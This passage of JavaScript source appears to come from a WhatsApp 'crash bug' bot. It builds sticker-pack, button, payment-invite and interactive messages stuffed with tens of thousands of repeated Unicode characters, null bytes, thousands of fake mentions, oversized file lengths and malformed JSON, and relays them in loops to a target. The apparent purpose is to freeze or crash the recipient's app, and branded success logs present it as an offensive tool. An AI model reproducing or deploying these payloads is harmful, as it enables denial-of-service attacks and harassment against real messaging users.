      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
      fileLength: 10737418240000,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: mentionedList,
        stanzaId: "1234567890ABCDEF",
        remoteJid: "t.me/killertzy2",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg4 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "᬴".repeat(20000),
          publisher: "᬴".repeat(20000),
          caption: " ┃► #Killertzy - Explore# 🩸. ",
          stickers: [
            ...Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🦠", "🩸"],
              accessibilityLabel: "",
              stickerSentTs: "PnX-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }))
          ],
          fileLength: "1073741824000",
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
          contextInfo: {
            remoteJid: "X",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: mentionedList
          },
          packDescription: "",
          mediaKeyTimestamp: "1747502082",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "999999999",
          stickerPackOrigin: "USER_CREATED",
        }
      }
    }
  }, {});

  const msg5 = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      contextInfo: {
        mentionedJid: mentionedList
      },
      text: "r4Ldz`impõssible.\u0000\u0000\u0000" + "᬴".repeat(55555),
      contentText: "᬴".repeat(55555),
      footerText: "᬴".repeat(55555),
      buttons: [
        {
          buttonId: ".x1" + "\u9999".repeat(70000),
          buttonText: { displayText: "᬴".repeat(20000) },
          type: 1
        },
        {
          buttonId: ".x2" + "\u9999".repeat(70000),
          buttonText: { displayText: "᬴".repeat(20000) },
          type: 1
        },
        {
          buttonId: ".x3" + "\u9999".repeat(70000),
          buttonText: { displayText: "᬴".repeat(20000) },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {});

  for (let raldz = 0; raldz < 2; raldz++) {
    for (const msg of [msg1, msg2, msg3, msg4, msg5]) {
      await sock.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message ?? msg
          }
        },
        pc
          ? { messageId: msg.key?.id, participant: { jid: target } } : { messageId: msg.key?.id }
      );
      console.log(chalk.green("SUCCESS SEND GS-GLX2STCPCK (AMOUNT:", raldz, ")"));
    }
  }
}

async function gsPayment(sock, target, pc = true) {
  for(let z = 0; z < 10; z++) {
    await sleep(1000);
    let msg = generateWAMessageFromContent(
      target,
      {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() * 999e+21
        }
      },
      {}
    );

    await sock.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      pc
        ? { messageId: msg.key.id, participant: { jid: target } }
        : { messageId: msg.key.id }
    );
  }
}

async function blankSticker(sock, target) {
    await sock.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name:
                    "𝚾 - 𝐊𝐢𝐥𝐥𝐞𝐫𝐓𝐳𝐲 - 𝟑𝐱𝐏𝐨𝐬𝟑𝐃   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞   ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["🦠"],
                        accessibilityLabel: "dvx",
                        isLottie: true,
                        mimetype: "application/pdf"
                    }
                ],

                fileLength: "999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",

                directPath:
                    "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",

                contextInfo: {},

                packDescription:
                    "𝚾 - 𝐀𝐩𝐨𝐥𝐥𝐨 𝐒𝐩𝐚𝐜𝐞 ༘‣" +
                    "؂ن؃؄ٽ؂ن؃".repeat(10000),

                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",

                thumbnailDirectPath:
                    "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",

                thumbnailSha256:
                    "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",

                thumbnailEncSha256:
                    "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",

                thumbnailHeight: 252,
                thumbnailWidth: 252,

                imageDataHash:
                    "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",

                stickerPackSize: "999999999",
                stickerPackOrigin: "1"
            }
        }, { participant: { jid: target }});
    }

async function InteractiveUI(sock, target) {
  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          body: {
            text: " ┃► #Killertzy - Explore# 🩸. " 
            + "ꦽ".repeat(100000) 
            + "ꦾ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`,
              },
              {
                name: "cta_url",
                buttonParamsJson:
                  "{\"display_text\":\"#4izxvelzExerc1st.\",\"url\":\"https://Wa.me/stickerpack/4izxvelzexect\",\"merchant_url\":\"https://Wa.me/stickerpack/4izxvelzexect\"}",
              },
            ],
            messageParamsJson: "{".repeat(10000),
          },
        },
      },
    },
  };

  await sock.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}